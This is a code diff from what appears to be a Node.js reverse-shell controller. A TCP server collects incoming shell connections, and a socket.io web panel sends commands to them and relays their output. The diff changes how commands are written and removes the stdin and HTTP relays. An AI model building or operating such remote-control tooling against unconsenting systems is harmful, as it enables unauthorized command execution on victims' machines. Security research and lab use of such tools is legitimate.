@@ -28,7 +28,7 @@ for(key in reverseShellContainer){
 
   socket.on('command', (data)=>{
     io.emit('command', data)
-    reverseShellContainer[data.id].write(data.command+'\n');
+    reverseShellContainer[data.id].write(Buffer.from(data.command+'\n'), 'utf8');
   })
 })
 
@@ -42,19 +42,12 @@ var tcpServer = tcp.createServer((socket)=>{
 
   console.log(reverseShellContainer);
 
-  process.stdin.on('data', (data)=>{
+/*  process.stdin.on('data', (data)=>{
     socket.write(data)
-  })
-
-  app.get('*', (req, res)=>{
-    socket.write(req.url)
-    //console.log('http request')
-    //res.send('success')
-  })
+  })*/
 
   socket.on('data', (buffer)=>{
     response = buffer.toString()
-    console.log(response)
     io.emit('response', {'id': id, 'response': response})
   })
 
